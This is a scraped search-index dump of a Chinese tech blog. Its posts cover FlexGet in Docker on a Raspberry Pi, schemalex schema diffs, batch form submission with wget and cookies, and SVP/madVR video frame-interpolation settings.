[docker]privileged参数_docker,privileged_追寻神迹-CSDN博客 Make jQuery :contains Case-Insensitive | CSS-Tricks jquery :contains case-Insensitive - JSFiddle inotify-tools使用方法介绍-Linux运维日志 CentOS 6.9上inotify-tools 安装及使用方法-Linux运维日志 rsync + inotify-tools 实现 Linux 文件双向实时同步 – Jacky’s Blog PHP用inotify扩展监控文件_chunyuan314的博客-CSDN博客 inotifywait命令_Linux inotifywait 命令用法详解：异步文件系统监控机制 Redis 阻塞、安全队列 BLPOP/BRPOPLPUSH - Silverd How To Quickly Generate A Large File On The Command Line (With Linux) - Skorks inotify-tools + php脚本实现Linux服务器文件监控并邮件提醒 - 黄小涛 - 博客园 ktbyers/netmiko: Multi-vendor library to simplify Paramiko SSH connections to network devices python獲取程式執行檔案路徑方法 - IT閱讀 ","date":"2020-01-10","objectID":"/blog/posts/cp-%E8%A4%87%E8%A3%BD%E6%AA%94%E6%A1%88%E5%8F%AF%E8%83%BD%E6%B2%92%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/:3:0","tags":["cp","linux"],"title":"cp 複製檔案可能沒注意的事情","uri":"/blog/posts/cp-%E8%A4%87%E8%A3%BD%E6%AA%94%E6%A1%88%E5%8F%AF%E8%83%BD%E6%B2%92%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/"},{"categories":["Linux"],"content":"之前 PI 1號機裝 HypriotOS: Back Again and Better then Ever · Docker Pirates ARMed with explosive stuff 內建 Docker 不需要手動安裝 相關教學可以看 如何在 Raspberry Pi 上安裝 Docker CE | IT 技術家 在 Raspberry Pi 2 運行 Docker ","date":"2020-01-08","objectID":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Docker-%E6%9E%B6%E8%A8%AD-flexget/:0:0","tags":["pi","flexget","docker"],"title":"Raspberry Pi 使用 Docker 架設 flexget","uri":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Docker-%E6%9E%B6%E8%A8%AD-flexget/"},{"categories":["Linux"],"content":"相關 arm Image 選擇 相關尋找來源可以看armhf’s Profile - Docker Hub 後來注意到DEPRECATED 裡面有建議從 arm32v7 和 arm32v6 去找 發現 arm32v7 我的 PI 1 不能用， PI 1 要使用 arm32v6 ","date":"2020-01-08","objectID":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Docker-%E6%9E%B6%E8%A8%AD-flexget/:1:0","tags":["pi","flexget","docker"],"title":"Raspberry Pi 使用 Docker 架設 flexget","uri":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Docker-%E6%9E%B6%E8%A8%AD-flexget/"},{"categories":["Linux"],"content":"安裝 flexget 目前測試網路上的 breneser/flexget-arm: docker container for running flexget 可以順利安裝 ","date":"2020-01-08","objectID":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Docker-%E6%9E%B6%E8%A8%AD-flexget/:2:0","tags":["pi","flexget","docker"],"title":"Raspberry Pi 使用 Docker 架設 flexget","uri":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Docker-%E6%9E%B6%E8%A8%AD-flexget/"},{"categories":["Linux"],"content":"安裝 flexget 最新版方法 其實把 image 換成 Python3 image 重新 build 就可以了 FROM arm32v6/python:3.8.1-alpine3.10 MAINTAINER bren RUN apk add --update \\ tzdata \\ python \\ py-pip \\ ca-certificates \\ \u0026\u0026 pip install --no-cache-dir --disable-pip-version-check flexget transmissionrpc \\ \u0026\u0026 rm -rf /var/cache/apk/* # Copy local files COPY files/ / # add default volumes VOLUME /config /data WORKDIR /config # expose port for flexget webui EXPOSE 3539 3539/tcp # run init.sh to set uid, gid, permissions and to launch flexget RUN chmod +x /scripts/init.sh CMD [\"/scripts/init.sh\"] 相關版本可以從arm32v6/python - Docker Hub Tag上去挑版本 arm32v6/python Tags - Docker Hub ","date":"2020-01-08","objectID":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Docker-%E6%9E%B6%E8%A8%AD-flexget/:2:1","tags":["pi","flexget","docker"],"title":"Raspberry Pi 使用 Docker 架設 flexget","uri":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Docker-%E6%9E%B6%E8%A8%AD-flexget/"},{"categories":["Linux"],"content":"alpine 開 bash 方法 在 docker 內建沒有 bash 在 dockerfile 裝 RUN apk add --update bash \u0026\u0026 rm -rf /var/cache/apk/* 參考https://github.com/smebberson/docker-alpine/issues/43#issuecomment-226970518 ","date":"2020-01-08","objectID":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Docker-%E6%9E%B6%E8%A8%AD-flexget/:3:0","tags":["pi","flexget","docker"],"title":"Raspberry Pi 使用 Docker 架設 flexget","uri":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Docker-%E6%9E%B6%E8%A8%AD-flexget/"},{"categories":["Linux"],"content":"/usr/share/zoneinfo/xxxx: No such file or directory tzdata 安裝這個能解決 上敘述問題 參考 時間 · ubuntu 學習筆記 用 alpine 應該會遇到這個問題 ","date":"2020-01-08","objectID":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Docker-%E6%9E%B6%E8%A8%AD-flexget/:4:0","tags":["pi","flexget","docker"],"title":"Raspberry Pi 使用 Docker 架設 flexget","uri":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Docker-%E6%9E%B6%E8%A8%AD-flexget/"},{"categories":["Linux"],"content":"最後… 最後發現 新版沒有 Config Editor 所以默默裝回去 有看到 Config Editor 看來好像還沒完成 順便留一下版本紀錄 Version info Flexget: 2.21.35 API: 1.5.0 ","date":"2020-01-08","objectID":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Docker-%E6%9E%B6%E8%A8%AD-flexget/:5:0","tags":["pi","flexget","docker"],"title":"Raspberry Pi 使用 Docker 架設 flexget","uri":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Docker-%E6%9E%B6%E8%A8%AD-flexget/"},{"categories":["Linux"],"content":"其他沒相關的紀錄 最近查有沒有監聽檔案新增方法，有找到 inotify-tool 目前尚未整理，先貼到這邊…預防沒寫 sof-object-listing/inotify at master · prashanthpai/sof-object-listing inotify-tools使用方法介绍-Linux运维日志 Ubuntu 若檔案這樣，就那樣的好物 inotify-tools » 記下來 - 專業偽筆記 inotify-tools工具inotifywatch实时监控网站目录_chaihongjun.me|柴宏俊web技术笔记 inotify-tools + php脚本实现Linux服务器文件监控并邮件提醒 相關未整理彩蛋 arm32v6/python Tags - Docker Hub docker-alpine redis how to get into bash · Issue #43 · smebberson/docker-alpine ytt - YAML Templating Tool FlexGet Better Comments - Visual Studio Marketplace 30 Seconds of Knowledge 从 PHP5.2 升级到 PHP7.1 遇到的函数参数问题 | Laravel China 社区 Incredibly slow upload speeds · Issue #798 · s3fs-fuse/s3fs-fuse amazon ec2 - S3fs performance improvements or alternative? - Server Fault amazon s3 - How can I mount an S3 bucket to an EC2 instance and write to it with PHP? - Stack Overflow 使用 s3curl 访问 OpenStack Swift spring - Uploading to Amazon S3 via curl route - Stack Overflow deepsentry/aws-s3-curl: Upload a file to a S3 bucket redis消息队列简单应用 - 掘金 手码两万余字，SpringMVC 包教包会 - 江南一点雨 - 博客园 使用curl和wget发送post请求_cws1214的专栏-CSDN博客 年轻人的第一个OAuth2.0 Server-Hydra | 一只程序汪的自我修养 - 點部落 開發者必備知識 - HTTP認證（HTTP Authentication） - Carson’s Tech Note thephpleague/oauth2-server: A spec compliant, secure by default PHP OAuth 2.0 Server schemalex/schemalex: Generate difference sql of two mysql schema Basic performance testing · Issue #22 · GoogleCloudPlatform/gcsfuse Laravel 和 Spring Boot 兩個 框架 比較創業篇（ 一： 開發效率） - 好文 - 码工具 Portainer 透過 TLS 認證 - Yi Yang’s Blog 時間 · ubuntu 學習筆記 docker-alpine redis how to get into bash · Issue #43 · smebberson/docker-alpine ","date":"2020-01-08","objectID":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Docker-%E6%9E%B6%E8%A8%AD-flexget/:6:0","tags":["pi","flexget","docker"],"title":"Raspberry Pi 使用 Docker 架設 flexget","uri":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Docker-%E6%9E%B6%E8%A8%AD-flexget/"},{"categories":["實用工具"],"content":"常常我們在測試 DB 環境 不會馬上上到正式環境 但都是分開改 alter table 之前有在 Dbeaver 有 migrate table 功能 但大致上我們工程師沒有 DB 的權限 要如何快速產生 alter table 語法呢? 其實之前有寫過 MySQL 比較兩個資料庫方法 | 程式狂想筆記 但一樣沒有產生 alter table sql 語法… 裡面的範例也沒有使用過 今天我發現 github 裡面有一個 schemalex 可以輕鬆產生 alter table 語法 ","date":"2020-01-02","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E8%B3%87%E6%96%99%E8%A1%A8-alter-table-%E8%AA%9E%E6%B3%95-schemalex/:0:0","tags":["sql"],"title":"快速產生資料表 alter table 語法 schemalex","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E8%B3%87%E6%96%99%E8%A1%A8-alter-table-%E8%AA%9E%E6%B3%95-schemalex/"},{"categories":["實用工具"],"content":"schemalex schemalex/schemalex: Generate difference sql of two mysql schema -- old.sql CREATE TABLE hoge ( id INTEGER NOT NULL AUTO_INCREMENT, PRIMARY KEY (id) ); -- new.sql CREATE TABLE hoge ( id INTEGER NOT NULL AUTO_INCREMENT, c VARCHAR (20) NOT NULL DEFAULT \"hoge\", PRIMARY KEY (id) ); CREATE TABLE fuga ( id INTEGER NOT NULL AUTO_INCREMENT, PRIMARY KEY (id) ); schemalex old.sql new.sql 就會印出 Alter table SQL 好處只要用phpmyadmin 匯出 create table 就可以完成!! 更多用法可以參考官網文件schemalex/schemalex: Generate difference sql of two mysql schema ","date":"2020-01-02","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E8%B3%87%E6%96%99%E8%A1%A8-alter-table-%E8%AA%9E%E6%B3%95-schemalex/:1:0","tags":["sql"],"title":"快速產生資料表 alter table 語法 schemalex","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E8%B3%87%E6%96%99%E8%A1%A8-alter-table-%E8%AA%9E%E6%B3%95-schemalex/"},{"categories":["實用工具"],"content":"快速產生 create sql 語法 SHOW CREATE TABLE tbl_name 相關查詢資料: MySQL :: MySQL 8.0 Reference Manual :: 13.7.7.10 SHOW CREATE TABLE Statement Go言語のデータベース用のライブラリを比較する - Koichi Ishida blog schemalex/git-schemalex: database migration tool for mysql schema is managed via git k0kubun/sqldef: Idempotent MySQL/PostgreSQL schema management by SQL rubenv/sql-migrate: SQL schema migration tool for Go. 如何快速比對資料庫結構差異並產生同步指令 - Yowko’s Notes SchemaCrawler - Free database schema discovery and comprehension tool ","date":"2020-01-02","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E8%B3%87%E6%96%99%E8%A1%A8-alter-table-%E8%AA%9E%E6%B3%95-schemalex/:2:0","tags":["sql"],"title":"快速產生資料表 alter table 語法 schemalex","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E8%B3%87%E6%96%99%E8%A1%A8-alter-table-%E8%AA%9E%E6%B3%95-schemalex/"},{"categories":["Linux"],"content":"最近收到一個工單 是有關於做大量資料做修改 目前有一隻程式做單一資料置換 要怎麼快速對大量資料直接用現有程式做呢? 那就多批發送表單吧 Google 到 使用curl和wget发送post请求_cws1214的专栏-CSDN博客 可以簡單用 wget 使用 為什麼使用 wget 做呢? 這樣就可以留下 log 紀錄檔 相同的url 後面可以加?idnum EX:wget --post-data=\"user=user1\u0026pass=pass1\u0026submit=Login\" http://domain.com/path/page_need_login.php?12345 接下來目錄下會有page_need_login.php?12345 這就可以當 log 資訊 快速解決!! 2020-02-04 今天接到一個需求，使用系統要大量資料做功能處理 但由於太多，頁面處理也需要很久的時間 於是這件工作變成 IT 工作需求 首先，這頁處理功能有確認帳號密碼 要先排除這個，需要找 wget 可以做 cookies 傳遞 XYZ的筆記本: Linux 使用 curl (wget) 自動訪問網頁 Export Cookies – 下載 🦊 Firefox 擴充套件（zh-TW） 抓取 cookies 方法 wget 開啟 cookie wget取cookies 用 cookies @ echochio :: 痞客邦 :: 使用wget -d --load-cookies=cookies \"https://dc2.safesync.com/test.ova?dl=1\" 參考[Mac] 使用 wget 送出 cookie，登入網站後下載檔案 | EPH 的程式日記 可以 debug 出東西 但是我想直接用瀏覽器 Cookies 出來 一直在想 Cookies 要怎麼組 Export Cookies – 下載 🦊 Firefox 擴充套件（zh-TW） 這個很快就解決問題 其實上述網頁就有寫格式，我當初沒注意到 有工具產生比較快 cookies 格式 dc2.safesync.com TRUE / FALSE 0 fmprm si XYZ的筆記本: Linux 使用 curl (wget) 自動訪問網頁 取cookies wget --cookies=on --keep-session-cookies --save-cookies=cookie.txt \"http://server.com/\" -O 123.html 用cookies wget --referer=\"http://server.com/\" --cookies=on --load-cookies=cookie.txt --keep-session-cookies --save-cookies=cookie.txt \"http://server.com/menu\" -O 456.html 取cookies 加 user \u0026 pass wget --cookies=on --save-cookies=cookies.txt --post-data 'user=chio\u0026password=chio' \"http://server.com/auth.php\" 用cookies wget --cookies=on --load-cookies=cookies.txt -m -E -k \"http://server.com/interesting/article.php\" wget取cookies 用 cookies @ echochio :: 痞客邦 :: 相信透過這些很簡單可以寫個自動化工具!! ","date":"2019-12-29","objectID":"/blog/posts/wget-%E5%81%9A-POST-%E8%A1%A8%E5%96%AE%E7%99%BC%E9%80%81/:0:0","tags":["linux"],"title":"wget 做 POST 表單發送","uri":"/blog/posts/wget-%E5%81%9A-POST-%E8%A1%A8%E5%96%AE%E7%99%BC%E9%80%81/"},{"categories":["Linux"],"content":"timeout try 次數 linux - Does WGET timeout? - Stack Overflow 預設 900 秒 嘗試次數 5 次 ","date":"2019-12-29","objectID":"/blog/posts/wget-%E5%81%9A-POST-%E8%A1%A8%E5%96%AE%E7%99%BC%E9%80%81/:1:0","tags":["linux"],"title":"wget 做 POST 表單發送","uri":"/blog/posts/wget-%E5%81%9A-POST-%E8%A1%A8%E5%96%AE%E7%99%BC%E9%80%81/"},{"categories":["影音"],"content":"最近買了 ET322QK C 螢幕 有 4K 跟 10bit 畫質 順便也換了 Nivda GTX 2060 顯示卡 之前舊的顯示卡是用 AMD 有使用 AMD FM 補幀 最近設定補幀研究設定 在這邊做個簡單紀錄 (不一定適合每一台電腦) 當然我也遇到一些問題 話說比較新的AMD 顯示卡不能做FM了 買新 AMD 顯示卡需要注意!!! SVP4 PRO 2020-12-03 最近快轉速度比較不會卡頓了 然後我發現用 MPC-HC 播放抖動其況比 PotPlayer 好 我原本以為撥放器都一樣… ","date":"2019-12-29","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/:0:0","tags":["補幀","SVP"],"title":"使用 SVP 補幀 4K 螢幕小記","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/"},{"categories":["影音"],"content":"相關教學文章 Potplayer+Lav Filters+madVR - 知乎 madVR - 知乎 实现PC视频播放最强画质教程( Potplayer播放器+MADVR插件) madvr 720p番剧播放非专业测试 - 第2页 - 电脑讨论 - Chiphell - 分享与交流用户体验 Fw: [心得] SVP/FM +MADVR設定 - 看板 PC_Shopping - 批踢踢實業坊 [VCB-Studio 科普教程 2.2] 基于 PotPlayer 和 madVR 的播放器教程（已更新 XySubFilter） | VCB-Studio 我有用這篇，推薦沒用 SVP 補真可以使用這個方式 通常在設定 MadVR 改成 10bit 跟 NGU Anti-Alias (scale) ","date":"2019-12-29","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/:1:0","tags":["補幀","SVP"],"title":"使用 SVP 補幀 4K 螢幕小記","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/"},{"categories":["影音"],"content":"補幀方法 一般電影我覺得不用做補幀動作 (1) 【极客周刊】玩游戏为何要60帧才流畅，电影却只需24帧？ - YouTube 我覺得這邊說的很清楚了 ","date":"2019-12-29","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/:2:0","tags":["補幀","SVP"],"title":"使用 SVP 補幀 4K 螢幕小記","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/"},{"categories":["影音"],"content":"SVP 補幀 前幾天 SVP Pro在半價 又找不到便宜的二手顯示卡 所以就決定衝了 使用下也遇到很多問題 推薦使用 MPC-HC 播放器 SVP 跟 Potplayer 使用好像沒辦法 10 bit SVP 4 User Manual - SmoothVideo Project (SVP) - frame doubling interpolation 所以我後來使用 SVP Pro 裡面內建的 MPC-HC 在設定上懶的在調整 SVP、MPC 設定 svp 裡面安裝的都裝一裝 除了你不想用的 youtube 套件 mpc 我看到很多人設定都要載入Lav Video/Audio mpc-hc不需要 load 原因 mpc 有分成兩種 反正 mpc-hc 有包Lav Video/Audio 不需做什麼額外設定 算滿方便的 我這邊設定 相關Lav Video/Audio可參考[VCB-Studio 科普教程 2.2] 基于 PotPlayer 和 madVR 的播放器教程（已更新 XySubFilter） | VCB-Studio 我不確定是不是 SVP 安裝好會用好設定 這邊字幕一定要換XySubFilter 2020-12-09 幫我同學裝 SVP pro 發現他不能選xy-SubFilter 假如 MPC 播放器不能選擇xy-SubFilter字幕的話，可以去上面 vcbs 連結裡面抓檔案下來安裝 建議從黑米奇SVP: 進階教程系列（三）　－　字幕渲染濾鏡 XySubFilter丶AssFilterMod（2022-06-11更新）去抓檔案。 不然有時候某些片段會 Lag 掉幀。(這邊是指舊電腦時期) 聲音可以用獨占模式，請參考這篇設定黑米奇SVP: 基本教程系列（四）　－　播放軟體 MPC-HC（2017-06-02更新） 「選項→播放器→輸出→音訊譜製器→內部音訊譜製器」 「內部音訊譜製器→獨占模式」另外允許「位元流」可以考慮打開(我不確定那個是做什麼用) 新撥放器發現變成要選啟動SaneAR Audio Renderer，才能選獨佔模式。 缺點、改善方法 內嵌字幕扭曲/偽影 老實說看動畫幾個非常動態畫面 內砍字幕會被影響到 但我也有查到改善方法睇片研究所: SVP artifacts masking(偽影去除)設定對畫質的影響及教學 SVP 著色器 設定複雜就比較沒這個問題 大部份這個設定就能改善 但幾個動態場景還是能感受到 這邊用「未日時在做甚麼?有沒有空?可以來拯救嗎?」幾個片段 另一個方法就是設定補插幀模式1.5m (少量偽影) 但流暢度有降底，我覺得沒是有補到幀，只是沒上面的流暢 不能說到完全沒有，但真的比較少 至於哪個比較好，看個人喜好選擇 MadVR (Ctrl+J) 看到 dropped frames 沒有看到明顯掉幀 播放影片左下角會有 SVP 圖示 其實可以在應用程式設定→顯示OSD資訊可以關閉 但我覺得打開可以很明顯知道是不是有正常啟動SVP 還算滿方便的 還滿適合用外掛字幕來看 詳細設定可參考:黑米奇SVP: SmoothVideo Project 系列（一）　－　安裝丶簡易設定（2019-05-04更新） ","date":"2019-12-29","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/:2:1","tags":["補幀","SVP"],"title":"使用 SVP 補幀 4K 螢幕小記","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/"},{"categories":["影音"],"content":"雙顯卡 AMD + Nivda 做補幀，先講一下!! 由於我朋友是用這個方法，他一樣使用Nivda GTX 2060 和 ET322QK C 螢幕，而外買二手 2000多塊 RX 560 可以參考這篇這定Fw: [心得] SVP/FM +MADVR設定 - 看板 PC_Shopping - 批踢踢實業坊 使用看畫面流暢，不過 MadVR (Ctrl+J) 看到 dropped frames 有增加 不過自己看畫面流暢比較重要，畢竟自己感覺比較重要 FM 補幀畫面雖然沒有 SVP 比較流暢…，但相對偽影也相當少(應該是沒有) 但相對 兩個 GPU 使用率其中一個也佔滿多的 跟 SVP 遇到狀況也差不多 但這個有很大的缺點，你的 Power 要夠力阿!!!! ","date":"2019-12-29","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/:2:2","tags":["補幀","SVP"],"title":"使用 SVP 補幀 4K 螢幕小記","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/"},{"categories":["影音"],"content":"遇到問題 ","date":"2019-12-29","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/:3:0","tags":["補幀","SVP"],"title":"使用 SVP 補幀 4K 螢幕小記","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/"},{"categories":["影音"],"content":"真 4K 影片卡頓 就暫時關掉 SVP 或 MadVR，我目前最大 1080P 居多 真人電影舊不需要開補幀 ","date":"2019-12-29","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/:3:1","tags":["補幀","SVP"],"title":"使用 SVP 補幀 4K 螢幕小記","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/"},{"categories":["影音"],"content":"顯示卡嘯叫 在電腦預設裝 MadVR 設定高畫質顯卡會發出聲音 預設安裝不會有這種聲音 後來裝Heaven Benchmark 跑 3D 軟體也發現有這個聲音 只要一關掉影片(或測試顯卡軟體)聲音馬上就不見 聲音跟這個一樣:RTX 2070 嘯叫(https://www.bilibili.com/video/av39265016/?redirectFrom=h5) 我用 MSI Afterburner把風扇關掉 ，有肉眼確認風扇沒有再轉，聲音還是有… 網路上有看到幾個方法， 更換顯示卡、主機板、電源供應器(但有些人換有失敗的，所以我不敢買) 顯卡供電口加濾波電容 (但我看到好像沒有人在賣8 pin + 濾波電容) 顯示卡 電流聲 高頻音 coil whine 解決方法(http://joeartanis.blogspot.com/2015/12/coil-whine.html) 有看這篇說能解決問題 但我找不到哪裡有在賣orz 膠水大法 https://www.bilibili.com/video/av8576153?from=search\u0026seid=12894762763554126401 裡面測試失敗 聽說比較高階顯卡會遇到這個問題 目前解決方法，把NGU設定調低 尤其搭 SVP 的時候叫的更明顯 不是越高就越好 後來我不斷測試調設定 發現 MSI Afterburner 看片的時候 GPU clock 飆到 紅色三角形就會嘯叫 GPU clock 會隨著調整 NGU 飆高 相關問題我有在各位有沒有遇到顯示卡嘯叫(高頻音)情況? - 灌水聊天 - VCB-Studio分享論壇 - Powered by Discuz!發問 ","date":"2019-12-29","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/:3:2","tags":["補幀","SVP"],"title":"使用 SVP 補幀 4K 螢幕小記","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/"},{"categories":["影音"],"content":"結論 網路上有各式各樣設定，我覺得不用比哪個設定比較好，自己看得舒服真的比較重用 SVP 是非常順暢，但是偽影、字幕扭曲、快轉lag(聽說有比以前好)真的是很大缺點 FM 不是每一個影片都會做補真 但是 FM 快轉不會頓、偽影字幕扭曲這個優勢真的很大 雙顯示卡方法補真也是不錯選擇 但每一個方法各有優缺點 大家可以選擇對自己有利的方法 自己看的舒服比較重要 ","date":"2019-12-29","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/:4:0","tags":["補幀","SVP"],"title":"使用 SVP 補幀 4K 螢幕小記","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/"},{"categories":["影音"],"content":"補幀細節參數設定 2020-12-03 推薦使用黑米奇SVP: 測試筆記：SVP最新測試版參數beta script（2020-11-18 更新） 裡面的Kevingwn版參數設定，複製到SVP4 PRO/Script 裡面去 覆蓋前可以先備份 Mickey版建議電腦比較好的人使用 我 CPU Intel 4790k 跑得非常 lag ，但流暢度應該會不錯吧?! 我也不確定 不過跑的人可能要注意，他裡面會放一些外部 plugin 移除Mickey版換回Kevingwn版有遇到奇怪的問題 播放器會跑出 not found ……. 應該是plugin 造成的，後來一直復原檔案重開某一次就好了… 這邊紀錄一下，我會拿哪些片段看偽影影片 1080P 方便以後比偽影有沒有比較好 以下用Kevingwn版有明顯改善 Princess Principal 05 14:06~18:58 15:15~15:23 火車鐵軌視野移動 16:19~16:21 臉部特寫 17:54~17:58 飛刀瞬間 這邊一定會偽影 紫羅蘭永恆花園 01 01:24~02:23 01:19~01:36 寫字、掉筆 後面紙飛出，也能觀查偽影 末日要做什麼? 01 05:22~05:35 這邊一定會偽影 天氣之子 01:30:12~01:36:56 (可以從重點重看XD) 01:35:00~01:35:05 進入雲層偽影 01:36:26~01:36:56 在旋轉那邊鞋子會有變形 鋼鍊 OP 裡面文字會抖 ","date":"2019-12-29","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/:5:0","tags":["補幀","SVP"],"title":"使用 SVP 補幀 4K 螢幕小記","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/"},{"categories":["影音"],"content":"MadVR 設定參考 【madVR 設置1/2】 https://www.bilibili.com/video/BV15d4y1Y7cj/?share_source=copy_web 【madVR設置 2/2】 https://www.bilibili.com/video/BV14D4y1h7EY/?share_source=copy_web 【MadVR补充说明】https://www.bilibili.com/read/cv20511561?spm_id_from=333.999.0.0 參考: MadVR設置2022/12/18更新! - 灌水聊天 - Anime字幕论坛 - Powered by Discuz! 20201118-madVR详解(转载自万年冷冻库) | zorg’s Blog Fw: [心得] SVP/FM +MADVR設定 - 看板 PC_Shopping - 批踢踢實業坊 ","date":"2019-12-29","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/:6:0","tags":["補幀","SVP"],"title":"使用 SVP 補幀 4K 螢幕小記","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/"},{"categories":["影音"],"content":"舊電腦設定 MadVR 設定 CPU: i7 4790K。 因為要重灌，留個備份，不建議參考設定。有要看以前設定可以讓我回來看。 基本上應該是我SVP 安裝預設設定和我忘記參考哪個文章去看得。 processing scaling algorithms rendering user interface ","date":"2019-12-29","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/:7:0","tags":["補幀","SVP"],"title":"使用 SVP 補幀 4K 螢幕小記","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/"},{"categories":["影音"],"content":"2023年 安裝 SVP 和 MadVR 和設定 由於 2023-02-15 買新電腦要重新安裝 SVP，忘記之前調整設定，這邊特別紀錄。網路上有很多種作法，但每個設定方法都不太一樣，不過我覺得挑自己看得舒服就可以了。 這邊整理幾個近幾年可以參考的: Windows最佳动画观看环境配置指南(MPC-HC, madvr, SVP, Anime4K) - ControlNet Blog Windows最佳動畫觀看環境組態指南(MPC-HC, madvr, SVP, Anime4K) - ControlNet Blog [情報] madVR v0.92.13發佈 - 看板 PC_Shopping - 批踢踢實業坊 當然上面的內容連結也可以參考。 ","date":"2019-12-29","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/:8:0","tags":["補幀","SVP"],"title":"使用 SVP 補幀 4K 螢幕小記","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/"},{"categories":["影音"],"content":"10 Bit和顏色設定 [VCB-Studio 科普教程 2.1] madVR 